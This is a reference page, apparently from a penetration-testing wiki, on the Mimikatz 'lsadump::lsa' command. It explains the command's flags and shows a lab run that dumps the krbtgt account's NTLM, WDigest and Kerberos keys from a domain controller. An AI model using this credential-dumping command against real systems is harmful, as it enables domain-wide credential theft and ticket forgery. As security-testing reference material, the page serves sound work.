# lsa

`lsadump::lsa` extracts hashes from memory by asking the LSA server. The `patch` or `inject` takes place on the fly. It has the following command line arguments:

* `/name` or `/user` : the target user account
* `/id` : the RID (relative identifier) for the target account (500 for Administrator)
* `/patch` : Only dumps the LM and NT password hashes
* `/inject` : when run on a workstation, it will dump the LM and NT password hashes. When run on domain controller is will dump LM, NT, Wdigest, Kerberos keys and password history.

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "NTLM" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

{% hint style="warning" %}
This command requires elevated privileges (by previously running [privilege::debug](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : hacklab / S-1-5-21-2725560159-1428537199-2260736313

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : b5348d0a20a24a67ff544146a09cd292
    LM   :
  Hash NTLM: b5348d0a20a24a67ff544146a09cd292
    ntlm- 0: b5348d0a20a24a67ff544146a09cd292
    lm  - 0: 90e43747fb3e2459bc0fbd4c64a48ab4

 * WDigest
    01  96336fb9042f4823a864a9a9ea953d92
    02  f02b41fe320a26b54de6278bf432ea6b
    03  c4d6aef8b8382e686fdf2d8bb9ed4325
    04  96336fb9042f4823a864a9a9ea953d92
    05  f02b41fe320a26b54de6278bf432ea6b
    06  6db8e37630a2ccb50d640b7e0575a75d
    07  96336fb9042f4823a864a9a9ea953d92
    08  eca32a7c67f70dcd78116b548428644a
    09  eca32a7c67f70dcd78116b548428644a
    10  65ff3b022e3c992e06672a9013e9e375
    11  2faee2bbb7f3ce7eea4da160314992c1
    12  eca32a7c67f70dcd78116b548428644a
    13  8208f726be15c605b1d9531b3f6ceb68
    14  2faee2bbb7f3ce7eea4da160314992c1
    15  4097da3573ce0e22b396f673cb338223
    16  4097da3573ce0e22b396f673cb338223
    17  fa880afaaeb637fafed4121f58ae1c0e
    18  20ad95aaa3a05e5bb731bfefbd7ee823
    19  d46bc56e4021f6410468193dc7d05e58
    20  4d01f91984530f183381bdf5f0605f63
    21  1b415947d31439c2e59ecb8a0cd3daeb
    22  1b415947d31439c2e59ecb8a0cd3daeb
    23  0c54e140ce4d3af2150f66672338f6f3
    24  12f6af7e274f18cc1299f792f81610f8
    25  12f6af7e274f18cc1299f792f81610f8
    26  b68781315989472c4536e52359a0c999
    27  293f6790b0e67296db60f201ef15d75b
    28  18b300eeed3faeb12fe39754ec4537ef
    29  b00feb2fe6a6218228116b62612d6946

 * Kerberos
    Default Salt : HACKLAB.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 97ec73858998ae68

 * Kerberos-Newer-Keys
    Default Salt : HACKLAB.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ab45a59d37a5a647e0d7d9d942d0e8b77911cff0bd95b16e203cd9503ccdd96
      aes128_hmac       (4096) : 3c8fc2890213fb9be3d6fb139b1be881
      des_cbc_md5       (4096) : 97ec73858998ae68

 * NTLM-Strong-NTOWF
    Random Value : 48d7d89c1608b83db8c568251f8b810f
```
